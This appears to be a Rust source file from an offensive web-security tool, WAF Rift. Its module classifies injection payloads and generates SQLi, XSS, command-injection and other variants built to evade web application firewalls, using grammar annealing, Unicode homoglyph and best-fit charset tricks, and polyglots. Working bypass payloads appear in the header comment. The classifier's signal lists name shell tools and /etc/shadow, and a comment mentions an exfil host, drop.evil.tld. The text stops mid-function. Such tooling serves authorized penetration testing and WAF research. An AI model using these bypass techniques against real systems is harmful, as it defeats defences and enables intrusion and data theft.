//! Grammar-aware payload mutation engine.
//!
//! This is WAF Rift's key differentiator. Instead of applying blind
//! syntactic transforms (URL-encode everything, insert comments), this
//! module understands the *semantics* of SQL, XSS, and command injection
//! payloads and generates equivalent variants that look completely
//! different to regex-based WAF rules.
//!
//! # Why this matters
//!
//! A WAF blocking `' OR 1=1--` and `<script>alert(1)</script>` will
//! miss these semantically identical payloads:
//!
//! ```text
//! SQL:  ' OR 'a' LIKE 'a'#
//! XSS:  <details open ontoggle=confirm`1`>
//! CMD:  ${IFS}c\at${IFS}/???/??ss??
//! ```
//!
//! # Architecture
//!
//! ```text
//! ┌─────────────┐
//! │ Classifier   │ ← Detects SQL, XSS, or CMD injection type
//! ├─────────────┤
//! │ SQL Mutator  │ ← Tautology swap, string split, UNION variants
//! │ XSS Mutator  │ ← Tag/event combos, exec functions, URI schemes
//! │ CMD Mutator  │ ← IFS tricks, path wildcards, variable indirection
//! ├─────────────┤
//! │ Combiner     │ ← Layers grammar mutations with encoding strategies
//! └─────────────┘
//! ```
//!
//! # Two mutation engines (intentional split — do NOT merge)
//!
//! This crate ships two grammar-mutation engines with **different jobs**.
//! They look similar (both touch SQL/XSS/CMD/SSRF notation) but are not
//! redundant; folding one into the other regresses real capability.
//!
//! * **`<class>::mutate` (this module's `mutate`/`mutate_as`)** — the broad
//!   *same-class fuzzer*. It emits many *different-target* / different-shape
//!   payloads (e.g. SSRF rotates in loopback, cloud-metadata, and rebinding
//!   hosts regardless of the input host) to maximise the chance that *some*
//!   variant slips a WAF when fired at an operator-chosen target. There is no
//!   soundness oracle because the variants deliberately are not the same
//!   attack. Used by `scan`'s exploration pass. Variant lists are Tier-B data
//!   under `rules/<class>/` (e.g. `rules/ssrf/mutate_variants.toml`).
//! * **`equiv::<class>::generate`** — the sound *same-attack* engine. Every
//!   variant is an oracle-verified semantic equivalent of the operator's
//!   exact payload (`equiv::<class>::still_*`), and it carries `DeliveryShape`
//!   transport bypasses. Used by `distill`, `bench`, and `scan`'s flagship
//!   "Equivalence moat".
//!
//! Concretely: `ssrf::mutate` emitting `http://2130706433` (fixed loopback as
//! integer) is fuzzer data; `equiv::ssrf::rw_ip_form` re-encoding the
//! *payload's own* host integer into a random `inet_aton` form is a
//! target-preserving rewrite. Same notation, different operation — sharing the
//! code would change what the fuzzer emits.

// §8 ARCHITECTURE: visibility narrowing.
// Modules with zero external callers (not imported in integration tests or
// other crates) are narrowed to pub(crate). The ones used by panic_safety_audit
// and cli/bypass_probe must remain pub.
pub mod cassandra;
// R56 pass-21 §9 WIRING: promote to pub so CfgMutatorState and the
// stateful oracle-feedback API surface at the crate root.
pub mod cfg_convergence;
pub mod cmd;
pub mod cmd_windows;
pub mod elastic;
pub mod equiv;
// jndi: no integration-test users — internal dispatch target only.
pub(crate) mod jndi;
pub mod ldap;
pub mod bestfit;
pub(crate) mod homoglyph_gen;
pub mod mongo;
pub mod nfkc_preimage;
pub mod path_traversal;
pub mod polyglot;
pub mod redis;
pub mod sql;
// ssi: no integration-test users — internal dispatch target only.
pub(crate) mod ssi;
pub mod ssrf;
pub mod template;
// unicode_norm: forward NFKC-fold + fullwidth detection for the classifier
// (detect_fullwidth/nfkc_fold_ascii) and the bench keyword oracle
// (reachable_keywords). Reverse homoglyph *generation* lives solely in
// nfkc_preimage (NO-DUP) — this module no longer mints bypass variants.
pub(crate) mod unicode_norm;
// variant_util: shared no-op-drop + dedup for the NoSQL mutators (§7 DEDUP).
pub(crate) mod variant_util;
pub mod xss;

// ── Classification thresholds ────────────────────────────────────────────────
//
// The classifier needs at least this many independent signals before committing
// to a class. A threshold of 1 means a single signal (e.g. a bare `select`)
// is enough — this is intentionally low because the downstream mutators handle
// unknown tokens gracefully; the risk of false-negative (missing a real attack)
// outweighs the risk of false-positive (wrong mutator applied). Raising this
// value will cause more payloads to fall through to `Unknown`.
/// Minimum signal count required to classify a payload as SQLi.
const CLASSIFY_SQL_MIN_SIGNALS: u32 = 1;
/// Minimum signal count required to classify a payload as XSS.
const CLASSIFY_XSS_MIN_SIGNALS: u32 = 1;
/// Minimum signal count required to classify a payload as CMDi.
const CLASSIFY_CMD_MIN_SIGNALS: u32 = 1;

// ── Mutation budget splits ────────────────────────────────────────────────────
//
// When `max_mutations` is divided among multiple sub-mutators, these fractions
// control the allocation. The values must sum to ≤ 1.0 per call site (the
// caller truncates the final vec to `max_mutations` as a defence-in-depth
// guard). Named constants prevent the same magic number appearing in three
// different match arms and drifting out of sync.

/// Fraction of the mutation budget allocated to the first of two equal halves.
/// Used by CMDi (Linux half vs Windows half). The remainder goes to the second.
const MUTATION_SPLIT_HALF: usize = 2;
/// Divisor for NoSQL mutations: 4 sub-mutators (Mongo / Elastic / Redis /
/// Cassandra), each getting `max_mutations / MUTATION_SPLIT_NOSQL + 1` slots.
const MUTATION_SPLIT_NOSQL: usize = 4;
/// Divisor for Unknown-class fan-out: spreads budget across N payload types.
const MUTATION_SPLIT_UNKNOWN: usize = 6;

/// What type of injection payload this is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum PayloadType {
    /// SQL injection (`SQLi`).
    Sql,
    /// Cross-site scripting (XSS).
    Xss,
    /// Operating system command injection.
    CommandInjection,
    /// LDAP injection.
    Ldap,
    /// Server-side request forgery (SSRF).
    Ssrf,
    /// Path/directory traversal.
    PathTraversal,
    /// Server-side template injection (SSTI).
    TemplateInjection,
    /// `NoSQL` injection (`MongoDB`, Elastic, Redis, Cassandra).
    NoSql,
    /// Server-Side Includes injection (Apache mod_include directives).
    /// Targets legacy/misconfigured Apache deployments where
    /// `Options +Includes` allows `<!--#exec cmd="…" -->` and
    /// related directives to run from request-reflected content.
    Ssi,
    /// JNDI/Log4Shell injection (CVE-2021-44228 and follow-ons).
    /// Targets log4j's recursive lookup-substitution engine via
    /// `${jndi:ldap://…}` and obfuscated variants.
    Jndi,
    /// Unknown — not clearly one of the above.
    Unknown,
}

/// A grammar-aware mutation of any payload type.
#[derive(Debug, Clone)]
pub struct GrammarMutation {
    /// The mutated payload.
    pub payload: String,
    /// What type of injection this is.
    pub payload_type: PayloadType,
    /// Human-readable description of the mutation.
    pub description: String,
    /// Which grammar rules were applied.
    pub rules_applied: Vec<&'static str>,
}

// ── §7 DEDUP: inner-mutation → GrammarMutation conversion ────────────────────
//
// SqlMutation, XssMutation, and CmdMutation all carry the same three fields
// (payload, description, rules_applied). The repeated `|m| GrammarMutation { … }`
// closures in mutate_as collapsed into one sealed trait + three impls.
//
// The trait is `pub(crate)` so it never leaks into the public API surface.

pub(crate) trait IntoGrammarMutation {
    fn into_grammar_mutation(self, payload_type: PayloadType) -> GrammarMutation;
}

impl IntoGrammarMutation for sql::SqlMutation {
    fn into_grammar_mutation(self, payload_type: PayloadType) -> GrammarMutation {
        GrammarMutation {
            payload: self.payload,
            payload_type,
            description: self.description,
            rules_applied: self.rules_applied,
        }
    }
}

impl IntoGrammarMutation for xss::XssMutation {
    fn into_grammar_mutation(self, payload_type: PayloadType) -> GrammarMutation {
        GrammarMutation {
            payload: self.payload,
            payload_type,
            description: self.description,
            rules_applied: self.rules_applied,
        }
    }
}

impl IntoGrammarMutation for cmd::CmdMutation {
    fn into_grammar_mutation(self, payload_type: PayloadType) -> GrammarMutation {
        GrammarMutation {
            payload: self.payload,
            payload_type,
            description: self.description,
            rules_applied: self.rules_applied,
        }
    }
}

impl IntoGrammarMutation for cmd_windows::CmdWindowsMutation {
    fn into_grammar_mutation(self, payload_type: PayloadType) -> GrammarMutation {
        GrammarMutation {
            payload: self.payload,
            payload_type,
            description: self.description,
            rules_applied: self.rules_applied,
        }
    }
}

/// Diversity policy for mutation generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DiversityPolicy {
    /// Pure random selection.
    Random,
    /// Coverage-guided: prefer unseen rule combinations.
    CoverageGuided,
    /// Target specific rule families.
    RuleTargeted(&'static [&'static str]),
}

/// Advanced mutation request with fine-grained control.
#[derive(Debug, Clone)]
pub struct MutationRequest {
    /// Maximum number of variants to generate.
    pub max_count: usize,
    /// Diversity policy to apply.
    pub diversity: DiversityPolicy,
    /// Explicitly exclude payloads matching these strings.
    pub exclude: std::collections::HashSet<String>,
}

impl Default for MutationRequest {
    fn default() -> Self {
        Self {
            max_count: 10,
            diversity: DiversityPolicy::Random,
            exclude: std::collections::HashSet::new(),
        }
    }
}

/// Classify a payload as SQL injection, XSS, or command injection.
///
/// Uses heuristic keyword matching. The classifier errs on the side of
/// returning `Unknown` rather than misclassifying — a misclassification
/// would apply wrong grammar rules and produce broken payloads.
#[must_use]
pub fn classify(payload: &str) -> PayloadType {
    // Short-circuit on SSI's unambiguous `<!--#…-->` envelope BEFORE
    // signal counting — otherwise the `=` and quoted-string in
    // `cmd="ls"` trips the SQL detector. SSI's envelope is exclusive
    // to Apache mod_include, no other attack class uses it.
    if ssi::detect_type(payload) {
        return PayloadType::Ssi;
    }

    // Short-circuit on JNDI/Log4Shell `${jndi:…}` envelope BEFORE signal
    // counting — the `${` syntax would otherwise trip the template-injection
    // detector, and the `://` in the URL body would confuse the SSRF detector.
    // JNDI's outer envelope is unambiguous (no other class uses `${jndi:`).
    if jndi::detect_type(payload) {
        return PayloadType::Jndi;
    }

    // R44-I5 fix (dogfood pass 4): strip Unicode bidirectional
    // direction-override codepoints (U+202A..U+202E, U+2066..U+2069)
    // and zero-width chars before the keyword scan. Pre-fix a
    // payload like "SELECT\u{202E}1" was classified as Unknown
    // because the inserted RTL override broke the substring match
    // of "select" — operator's "SQL" intent silently became
    // generic-class mutations. Strip these so the classifier sees
    // the intended characters.
    let scrubbed: String = payload
        .chars()
        .filter(|c| {
            !matches!(
                *c,
                '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}'
            )
        })
        .collect();

    // §3 CAPABILITY + §11 UTILIZATION: if the payload contains fullwidth
    // Unicode characters (U+FF21..U+FF3A / U+FF41..U+FF5A), normalise them
    // to ASCII via nfkc_fold_ascii before the keyword scan.  This ensures
    // payloads like "ａlert(1)" (fullwidth 'a') classify as XSS rather than
    // Unknown.  `detect_fullwidth` is the gate so we avoid the fold on the
    // common case of pure-ASCII payloads.
    let scrubbed = if unicode_norm::detect_fullwidth(&scrubbed) {
        unicode_norm::nfkc_fold_ascii(&scrubbed)
    } else {
        scrubbed
    };

    let lower = scrubbed.to_ascii_lowercase();

    // SQL indicators (weighted — require multiple signals)
    let sql_signals: u32 = [
        lower.contains("select"),
        lower.contains("union"),
        lower.contains("insert"),
        lower.contains("update"),
        lower.contains("delete"),
        lower.contains("drop"),
        lower.contains(" or ") && (lower.contains('=') || lower.contains("like")),
        lower.contains(" and ") && lower.contains('='),
        lower.contains("1=1"),
        lower.contains("--") && (lower.contains('\'') || lower.contains('=')),
        lower.contains('\'') && lower.contains('='),
        lower.contains("order by"),
        lower.contains("group by"),
        lower.contains("having"),
        lower.contains("sleep("),
        lower.contains("benchmark("),
        lower.contains("waitfor"),
    ]
    .iter()
    .filter(|&&x| x)
    .count() as u32;

    // XSS indicators
    let xss_signals: u32 = [
        lower.contains("<script"),
        lower.contains("</script"),
        lower.contains("onerror"),
        lower.contains("onload"),
        lower.contains("onclick"),
        lower.contains("onfocus"),
        lower.contains("onmouseover"),
        lower.contains("alert("),
        lower.contains("confirm("),
        lower.contains("prompt("),
        lower.contains("javascript:"),
        lower.contains("<img"),
        lower.contains("<svg"),
        lower.contains("<iframe"),
        lower.contains("<body"),
        lower.contains("document.cookie"),
        lower.contains("eval("),
    ]
    .iter()
    .filter(|&&x| x)
    .count() as u32;

    // §1 SPEED: `contains_shell_command` is an O(n·m) scan (n = payload len,
    // m = command table size). Pre-fix it was called up to 11 times in this
    // function: 6 times inside the signal-counting array, once more for the
    // `starts_with` signal, then up to 7 more times inside the
    // `has_separator_signal` block that runs when cmd_signals wins. Hoisting
    // the call to a single boolean eliminates the redundant work. For a
    // typical 60-char CMDi payload the old path did ~11 × 14-command linear
    // scans = ~924 comparisons; the new path does exactly 1 = ~84.
    let has_shell_cmd = contains_shell_command(&lower);

    // Command injection indicators
    let has_sep_with_cmd = (lower.contains("; ") || lower.contains("| ")
        || lower.contains("&& ") || lower.contains("|| ")
        || lower.contains('`') || lower.contains("$("))
        && has_shell_cmd;
    let has_separator_signal = has_sep_with_cmd
        || lower.contains("${ifs}")
        || (has_shell_cmd && lower.starts_with([';', '|']));
    let cmd_signals: u32 = [
        lower.contains("; ") && has_shell_cmd,
        lower.contains("| ") && has_shell_cmd,
        lower.contains("&& ") && has_shell_cmd,
        lower.contains("|| ") && has_shell_cmd,
        lower.contains('`') && has_shell_cmd,
        lower.contains("$(") && has_shell_cmd,
        lower.contains("/etc/passwd"),
        lower.contains("/etc/shadow"),
        lower.contains("/bin/"),
        lower.contains("${ifs}"),
        has_shell_cmd && lower.starts_with([';', '|']),
    ]
    .iter()
    .filter(|&&x| x)
    .count() as u32;

    // Return the type with the highest signal count.
    if sql_signals >= xss_signals && sql_signals >= cmd_signals && sql_signals >= CLASSIFY_SQL_MIN_SIGNALS {
        PayloadType::Sql
    } else if xss_signals >= sql_signals && xss_signals >= cmd_signals && xss_signals >= CLASSIFY_XSS_MIN_SIGNALS {
        PayloadType::Xss
    } else if cmd_signals >= CLASSIFY_CMD_MIN_SIGNALS {
        // Before accepting CMDi, check if this is actually path traversal.
        // A bare "../../../etc/passwd" has no shell separator — it's LFI, not CMDi.
        // CMDi requires at least one separator-triggered signal (;, |, &&, ||, `, $()
        // or ${IFS}). If the only match is /etc/passwd or /bin/ without a separator,
        // it's path traversal. `has_separator_signal` was computed above.
        // (No repeated `contains_shell_command` calls here.)
        if has_separator_signal {
            PayloadType::CommandInjection
        } else if path_traversal::detect_type(payload) {
            PayloadType::PathTraversal
        } else {
            // Pre-fix this fell through to CommandInjection even with no
            // separator. A bare `/etc/passwd` or `/bin/ls` token is path
            // disclosure / LFI, not command injection — without `; | &
            // && || $() ` `${IFS}` we cannot claim the shell was reached.
            // Try the remaining specific types before defaulting.
            if ssi::detect_type(payload) {
                PayloadType::Ssi
            } else if jndi::detect_type(payload) {
                PayloadType::Jndi
            } else if ldap::detect_type(payload) {
                PayloadType::Ldap
            } else if ssrf::detect_type(payload) {
                PayloadType::Ssrf
            } else if template::detect_type(payload) {
                PayloadType::TemplateInjection
            } else if mongo::detect_type(payload)
                || elastic::detect_type(payload)
                || redis::detect_type(payload)
                || cassandra::detect_type(payload)
            {
                PayloadType::NoSql
            } else {
                PayloadType::Unknown
            }
        }
    } else {
        // No core type match — check extended types. SSI's
        // `<!--#…-->` envelope is unambiguous, so it goes first.
        // JNDI check follows: `${jndi:` is unambiguous and must
        // not be aliased to TemplateInjection (which also uses `${`).
        if ssi::detect_type(payload) {
            PayloadType::Ssi
        } else if jndi::detect_type(payload) {
            PayloadType::Jndi
        } else if ldap::detect_type(payload) {
            PayloadType::Ldap
        } else if ssrf::detect_type(payload) {
            PayloadType::Ssrf
        } else if path_traversal::detect_type(payload) {
            PayloadType::PathTraversal
        } else if template::detect_type(payload) {
            PayloadType::TemplateInjection
        } else if mongo::detect_type(payload)
            || elastic::detect_type(payload)
            || redis::detect_type(payload)
            || cassandra::detect_type(payload)
        {
            PayloadType::NoSql
        } else {
            PayloadType::Unknown
        }
    }
}

/// Check if a string contains a common shell command as a whole token.
///
/// Pre-fix this used `.contains()` substring matching, so short command
/// names like `id` and `nc` matched as substrings inside ordinary words —
/// `consider`, `validate`, `android`, `since`, `concert`. The classifier
/// would then mis-route benign text as command injection.
fn contains_shell_command(s: &str) -> bool {
    // Patterns that already include a trailing space act as their own
    // boundary on the right. The remaining bare commands need whole-word
    // matching.
    let prefixed = ["cat ", "ls ", "wget ", "curl ", "ping ", "nc ", "dig "];
    if prefixed.iter().any(|cmd| s.contains(cmd)) {
        return true;
    }
    let bare = [
        "id", "whoami", "bash", "sh", "python", "perl", "ruby", "php", "uname", "env", "printenv",
        "nslookup", "ifconfig", "ip addr",
    ];
    let bytes = s.as_bytes();
    let is_boundary = |b: u8| -> bool {
        matches!(
            b,
            b' ' | b'\t'
                | b'\n'
                | b'\r'
                | b';'
                | b'|'
                | b'&'
                | b'`'
                | b'$'
                | b'('
                | b')'
                | b'<'
                | b'>'
                | b'\''
                | b'"'
                | b'/'
                | b'\\'
                | 0
        )
    };
    bare.iter().any(|cmd| {
        let cmd_bytes = cmd.as_bytes();
        if cmd_bytes.is_empty() || bytes.len() < cmd_bytes.len() {
            return false;
        }
        let mut i = 0;
        while i + cmd_bytes.len() <= bytes.len() {
            if bytes[i..i + cmd_bytes.len()] == *cmd_bytes {
                let left_ok = i == 0 || is_boundary(bytes[i - 1]);
                let right_ok =
                    i + cmd_bytes.len() == bytes.len() || is_boundary(bytes[i + cmd_bytes.len()]);
                if left_ok && right_ok {
                    return true;
                }
            }
            i += 1;
        }
        false
    })
}

/// Generate grammar-aware mutations for any payload.
///
/// Automatically classifies the payload type and generates semantically
/// equivalent variants using the appropriate grammar module. If the type
/// is known in advance, use the specific `sql::mutate`, `xss::mutate`,
/// or `cmd::mutate` functions directly.
///
/// # Arguments
/// * `payload` — The injection payload to mutate
/// * `max_mutations` — Maximum number of variants to generate
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<GrammarMutation> {
    let payload_type = classify(payload);
    mutate_as(payload, payload_type, max_mutations)
}

/// Generate grammar-aware mutations using an advanced request.
#[must_use]
pub fn mutate_request(
    payload: &str,
    payload_type: PayloadType,
    request: &MutationRequest,
) -> Vec<GrammarMutation> {
    let mut base = mutate_as(payload, payload_type, request.max_count);
    if !request.exclude.is_empty() {
        base.retain(|m| !request.exclude.contains(&m.payload));
    }
    match request.diversity {
        DiversityPolicy::Random => base,
        DiversityPolicy::CoverageGuided => {
            // §1 SPEED: key directly on Vec<&'static str> (Hash+Eq) — avoids
            // allocating a joined String per candidate compared to join(",").
            let mut seen: std::collections::HashSet<Vec<&'static str>> =
                std::collections::HashSet::new();
            base.into_iter()
                .filter(|m| seen.insert(m.rules_applied.clone()))
                .collect()
        }
        DiversityPolicy::RuleTargeted(rules) => base
            .into_iter()
            .filter(|m| m.rules_applied.iter().any(|r| rules.contains(r)))
            .collect(),
    }
}

/// Stream grammar mutations as an iterator.
///
/// Equivalent to calling [`mutate_request`] and converting the result
/// to an iterator. The full mutation Vec is materialised up-front;
/// iteration is over the completed collection. Use when a caller
/// prefers an iterator interface over a `Vec` (e.g. chaining with
/// `.filter()` or `.take()`).
pub fn mutate_streaming(
    payload: &str,
    payload_type: PayloadType,
    request: &MutationRequest,
) -> impl Iterator<Item = GrammarMutation> {
    mutate_request(payload, payload_type, request).into_iter()
}

/// Generate grammar-aware mutations for a payload of known type.
///
/// Use this when the payload type is already known (e.g., from a
/// scanner that knows it's testing SQL injection).
/// Slots reserved in each mutation budget for the normalization-differential
/// engines (NFKC homoglyph / best-fit / dot-leader / layered) so the base
/// per-class mutators never consume the whole budget and starve them. Sized so
/// even a small `--level light` budget surfaces a few homoglyph/best-fit forms.
const NORM_DIFFERENTIAL_RESERVE: usize = 8;

#[must_use]
pub fn mutate_as(
    payload: &str,
    payload_type: PayloadType,
    max_mutations: usize,
) -> Vec<GrammarMutation> {
    match payload_type {
        PayloadType::Sql => {
            // Reserve 7 slots for CFG-convergence variants (one per SQL_TEMPLATES
            // entry) so they are never crowded out by the base SQL mutators,
            // plus NORM_DIFFERENTIAL_RESERVE for the best-fit/NFKC variants so the
            // base SQL mutators don't starve them (dogfood: `wafrift evade`).
            // The CFG variants are higher-quality (Boltzmann-guided) and must
            // always be present in the output when the budget allows it.
            let base_budget = max_mutations
                .saturating_sub(7 + NORM_DIFFERENTIAL_RESERVE)
                .max(1);
            let mut results: Vec<GrammarMutation> = sql::mutate(payload, base_budget)
                .into_iter()
                .map(|m| m.into_grammar_mutation(PayloadType::Sql))
                .collect();

            // §11 UTILIZATION: wire CfgMutator (BWAFSQLi convergence-annealing
            // grammar) into the SQL mutation pipeline. This was previously a
            // complete implementation with zero production callers — a §11 dead
            // code violation. We emit a small number of CFG-guided variants using
            // canonical SQL injection templates so the convergence machinery is
            // actually reachable from `wafrift evade`/`scan`/`bench-waf`.
            //
            // The CfgMutator takes NON-TERMINAL templates (e.g.
            // `{str_open}{ws}{or}{ws}{tautology}{comment}`), not real payloads.
            // We emit from the three most common SQL injection shapes: boolean-OR,
            // boolean-AND, and terminator-comment. The seed is deterministic so
            // identical inputs produce identical outputs (oracle soundness).
            // Leave NORM_DIFFERENTIAL_RESERVE slots for the normalization block
            // below — the CFG sampler is greedy and otherwise fills the entire
            // budget (dogfood: SQL `evade` emitted zero best-fit/NFKC forms).
            let cfg_ceiling = max_mutations.saturating_sub(NORM_DIFFERENTIAL_RESERVE);
            if results.len() < cfg_ceiling {
                // Deterministic seed derived from the payload hash so identical
                // payloads get identical CFG samples across runs.
                let seed: u64 = payload
                    .bytes()
                    .fold(0x7761_6672_6966_7421_u64, |acc, b| {
                        acc.wrapping_mul(0x9e37_79b9_7f4a_7c15)
                            .wrapping_add(u64::from(b))
                    });
                // Use the full canonical SQL_TEMPLATES set (all 7 shapes).
                let budget = cfg_ceiling
                    .saturating_sub(results.len())
                    .min(cfg_convergence::SQL_TEMPLATES.len());
                let mut mutator = cfg_convergence::CfgMutator::builder()
                    .productions(cfg_convergence::default_sql_productions())
                    .temperature(1.0)
                    .cooling_rate(0.85)
                    .min_temperature(0.01)
                    .seed(seed)
                    .build();
                // Labels parallel SQL_TEMPLATES index-for-index.
                const SQL_TEMPLATE_LABELS: &[&str] = &[
                    "cfg_boolean_or",         // {str_open}{ws}{or}{ws}{tautology}{comment}
                    "cfg_boolean_or_ws",      // {str_open}{ws}{or}{ws}{tautology}{ws}{comment}
                    "cfg_boolean_and",        // {str_open}{ws}{and}{ws}{tautology}{comment}
                    "cfg_nested_quote_or",    // {str_open}{ws}{or}{ws}{str_open}{tautology}{str_open}{comment}
                    "cfg_numeric_or",         // 1{ws}{or}{ws}{tautology}{comment}
                    "cfg_numeric_and",        // 1{ws}{and}{ws}{tautology}{comment}
                    "cfg_equality",           // {str_open}{eq}{tautology}{comment}
                ];
                let templates: Vec<(&str, &str)> = cfg_convergence::SQL_TEMPLATES
                    .iter()
                    .zip(SQL_TEMPLATE_LABELS.iter())
                    .map(|(&t, &l)| (t, l))
                    .collect();
                'outer: for _ in 0..budget {
                    // Once converged, all further expansions are deterministic
                    // (same highest-score production fires every time) — no
                    // new unique variants possible. Stop early.
                    if mutator.is_converged() {
                        break;
                    }
                    for &(template, rule) in templates.as_slice() {
                        if results.len() >= cfg_ceiling {
                            break 'outer;
                        }
                        let expanded = mutator.expand(template);
                        // Skip if identical to an existing mutation or to the
                        // original payload (the CFG starts with bypass_score=0
                        // so initial samples may be uninteresting).
                        if !results.iter().any(|r| r.payload == expanded)
                            && expanded != payload
                        {
                            results.push(GrammarMutation {
                                payload: expanded,
                                payload_type: PayloadType::Sql,
                                description: format!(
                                    "CFG convergence-annealing ({rule})"
                                ),
                                rules_applied: vec!["cfg_convergence", rule],
                            });
                        }
                        mutator.anneal();
                    }
                }
            }

            // Normalization-differential variants. best-fit is the canonical
            // best-fit SQLi primitive: a curly quote `'` carries none of the
            // literal `'` a delimiter WAF rule policies, yet the origin's
            // charset down-conversion (MySQL latin1, WideCharToMultiByte) coerces
            // it straight back, firing the string breakout. NFKC homoglyphs cover
            // origins that normalize before querying. Each provably folds to the
            // EXACT payload (engine soundness gate), so the injection is intact.
            if results.len() < max_mutations {
                // Raw normalization variants + the layered (also %XX-encoded)
                // forms that defeat a WAF normalizing at a different decode
                // depth than the origin.
                let norm = bestfit::variants(payload, 16)
                    .into_iter()
                    .chain(nfkc_preimage::variants(payload, 16))
                    .chain(bestfit::composed_variants(payload, 8))
                    .chain(nfkc_preimage::composed_variants(payload, 8));
                for variant in norm {
                    if results.len() >= max_mutations {
                        break;
                    }
                    if variant != payload && !results.iter().any(|r| r.payload == variant) {
                        results.push(GrammarMutation {
                            payload: variant,
                            payload_type: PayloadType::Sql,
                            description:
                                "normalization-differential (best-fit / NFKC, ±%-layer) bypass"
                                    .into(),
                            rules_applied: vec!["normalization_differential"],
                        });
                    }
                }
            }

            // Polyglot SQL+XSS
            if results.len() < max_mutations {
                for p in polyglot::polyglots_for("sql") {
                    if results.len() >= max_mutations {
                        break;
                    }
                    results.push(GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::Sql,
                        description: "SQL+XSS polyglot".into(),
                        rules_applied: vec!["polyglot_sql_xss"],
                    });
                }
            }
            // Defense-in-depth: never exceed the documented contract.
            results.truncate(max_mutations);
            results
        }
        PayloadType::Xss => {
            // Reserve 5 slots for CFG-convergence XSS variants (one per
            // XSS_TEMPLATES entry) so they are never crowded out, plus
            // NORM_DIFFERENTIAL_RESERVE for the homoglyph/best-fit variants.
            let base_budget = max_mutations
                .saturating_sub(5 + NORM_DIFFERENTIAL_RESERVE)
                .max(1);
            let mut results: Vec<GrammarMutation> = xss::mutate(payload, base_budget)
                .into_iter()
                .map(|m| m.into_grammar_mutation(PayloadType::Xss))
                .collect();

            // §11 UTILIZATION: wire CFG convergence-annealing into XSS mutations.
            // XSS templates use {tag_open}, {event}, {sep}, {exec} non-terminals.
            if results.len() < max_mutations {
                let seed: u64 = payload
                    .bytes()
                    .fold(0x7861_7373_6672_6565_u64, |acc, b| {
                        acc.wrapping_mul(0x9e37_79b9_7f4a_7c15)
                            .wrapping_add(u64::from(b))
                    });
                // Use the full canonical XSS_TEMPLATES set (all 5 shapes).
                let budget = (max_mutations - results.len()).min(
                    cfg_convergence::XSS_TEMPLATES.len()
                );
                let mut mutator = cfg_convergence::CfgMutator::builder()
                    .productions(cfg_convergence::default_xss_productions())
                    .temperature(1.0)
                    .cooling_rate(0.85)
                    .min_temperature(0.01)
                    .seed(seed)
                    .build();
                // Labels parallel XSS_TEMPLATES index-for-index.
                const XSS_TEMPLATE_LABELS: &[&str] = &[
                    "cfg_img_onerror",     // {tag_open}img{sep}{event}={exec}>
                    "cfg_svg_onload",      // {tag_open}svg{sep}{event}={exec}>
                    "cfg_body_onload",     // {tag_open}body{sep}{event}={exec}>
                    "cfg_details_toggle",  // {tag_open}details{sep}open{sep}{event}={exec}>
                    "cfg_input_autofocus", // {tag_open}input{sep}autofocus{sep}{event}={exec}>
                ];
                let templates: Vec<(&str, &str)> = cfg_convergence::XSS_TEMPLATES
                    .iter()
                    .zip(XSS_TEMPLATE_LABELS.iter())
                    .map(|(&t, &l)| (t, l))
                    .collect();
                'xss_outer: for _ in 0..budget {
                    // Once converged, further expansions are deterministic —
                    // break to avoid emitting identical duplicates.
                    if mutator.is_converged() {
                        break;
                    }
                    for &(template, rule) in templates.as_slice() {
                        if results.len() >= max_mutations {
                            break 'xss_outer;
                        }
                        let expanded = mutator.expand(template);
                        // Validate semantic integrity: the expanded variant must
                        // still constitute a real XSS attack (e.g. some {tag_open}
                        // productions emit hex-escaped forms that don't parse as
                        // tags in the oracle's normalisation layer).
                        if !results.iter().any(|r| r.payload == expanded)
                            && expanded != payload
                            && equiv::xss::still_executes_xss(payload, &expanded)
                        {
                            results.push(GrammarMutation {
                                payload: expanded,
                                payload_type: PayloadType::Xss,
                                description: format!(
                                    "CFG convergence-annealing ({rule})"
                                ),
                                rules_applied: vec!["cfg_convergence", rule],
                            });
                        }
                        mutator.anneal();
                    }
                }
            }

            // Unicode normalization-differential mutations: WAFs normalising
            // to NFC miss fullwidth/math-bold forms; NFKC-capable back-ends
            // reconstruct the attack. Add these as additional XSS variants.
            // §12 TESTING: validate with still_executes_xss before adding —
            // fullwidth Unicode normalisation doesn't preserve structured
            // exfil markers (//drop.evil.tld/) in the oracle's normaliser, so
            // those variants must not escape into the output for structured
            // attacks.
            if results.len() < max_mutations {
                // nfkc_preimage: the complete inverse-NFKC homoglyph set (every
                // codepoint Unicode folds to ASCII), generated via style-pass,
                // single-codepoint, and alternating strategies — which strictly
                // subsume the former hand-rolled fullwidth/math/mixed styles —
                // each gated by NFKC(variant)==payload.
                let norm_variants = nfkc_preimage::variants(payload, 24)
                    .into_iter()
                    // best-fit coerces curly quotes → ASCII quotes (attribute
                    // breakout); origin charset down-conversion recovers them.
                    .chain(bestfit::variants(payload, 16));
                for variant in norm_variants {
                    if results.len() >= max_mutations {
                        break;
                    }
                    if equiv::xss::still_executes_xss(payload, &variant) {
                        results.push(GrammarMutation {
                            payload: variant,
                            payload_type: PayloadType::Xss,
                            description: "Unicode normalization-differential (NFC vs NFKC) bypass".into(),
                            rules_applied: vec!["unicode_norm_differential"],
                        });
                    }
                }
            }
            results.truncate(max_mutations);
            results
        }
        PayloadType::CommandInjection => {
            // §1 SPEED: pre-size to max_mutations to avoid growth reallocs.
            let mut results = Vec::with_capacity(max_mutations);
            let per = max_mutations / MUTATION_SPLIT_HALF + max_mutations % MUTATION_SPLIT_HALF;
            results.extend(
                cmd::mutate(payload, per)
                    .into_iter()
                    .map(|m| m.into_grammar_mutation(PayloadType::CommandInjection)),
            );
            results.extend(
                cmd_windows::mutate(payload, max_mutations - results.len())
                    .into_iter()
                    .map(|m| m.into_grammar_mutation(PayloadType::CommandInjection)),
            );
            // Polyglot CMD+XSS
            if results.len() < max_mutations {
                for p in polyglot::polyglots_for("cmd") {
                    if results.len() >= max_mutations {
                        break;
                    }
                    results.push(GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::CommandInjection,
                        description: "CMD+XSS polyglot".into(),
                        rules_applied: vec!["polyglot_cmd_xss"],
                    });
                }
            }
            results.truncate(max_mutations);
            results
        }
        PayloadType::Ldap => ldap::mutate(payload)
            .into_iter()
            .take(max_mutations)
